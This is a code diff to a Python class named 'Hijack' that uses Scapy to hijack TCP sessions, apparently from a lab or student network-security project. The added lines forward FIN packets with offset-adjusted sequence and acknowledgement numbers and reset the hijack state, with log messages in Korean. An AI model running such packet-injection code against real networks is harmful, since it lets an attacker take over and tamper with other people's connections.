@@ -91,6 +91,23 @@ class Hijack:
 					print("Received from client: " + packet.getlayer("Raw").load.decode())
 					self.my_seq += payload_len
 				send(new_packet, iface=self.dev, verbose=False)
+		elif flags == "FA" or flags == "FPA":
+			print("세션 종료 패킷 감지 (%s). 반대편으로 forward" % flags)
+
+			if ip.src == self.srv_ip:
+				new_packet = IP(src=ip.src, dst=ip.dst) / TCP(sport=tcp.sport, dport=tcp.dport, seq=tcp.seq, ack=tcp.ack - self.my_offset, flags=tcp.flags)
+			else:
+				new_packet = IP(src=ip.src, dst=ip.dst) / TCP(sport=tcp.sport, dport=tcp.dport, seq=tcp.seq + self.my_offset, ack=tcp.ack, flags=tcp.flags)
+
+			if packet.haslayer("Raw"):
+				new_packet = new_packet / Raw(load=packet.getlayer("Raw").load)
+			send(new_packet, iface=self.dev, verbose=False)
+
+			print("FIN 전달 완료. 세션 초기화")
+			self.my_seq = 0
+			self.my_ack = 0
+			self.my_offset = 0
+			self.hijacked = False
 
 	def run(self):
 		if self.client_ip:
